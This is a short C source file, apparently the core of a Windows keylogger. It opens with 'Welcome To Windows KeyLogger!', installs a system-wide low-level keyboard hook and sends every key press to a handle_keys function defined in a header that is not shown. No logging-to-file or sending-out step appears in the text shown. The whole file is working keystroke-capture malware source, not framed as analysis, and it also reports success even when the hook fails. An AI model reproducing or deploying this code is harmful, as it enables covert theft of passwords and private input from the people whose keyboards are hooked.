#include <stdio.h>
#include <windows.h>
#include "keylog.h"

LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    if (code == HC_ACTION)
    {
        KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN)
        {
            DWORD vkCode = pkey->vkCode;
            handle_keys(vkCode);
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    printf("Welcome To Windows KeyLogger!\n");
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL)
        printf("Hook wasn't installed!\n");
    printf("Hook was installed successfully!\n");
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}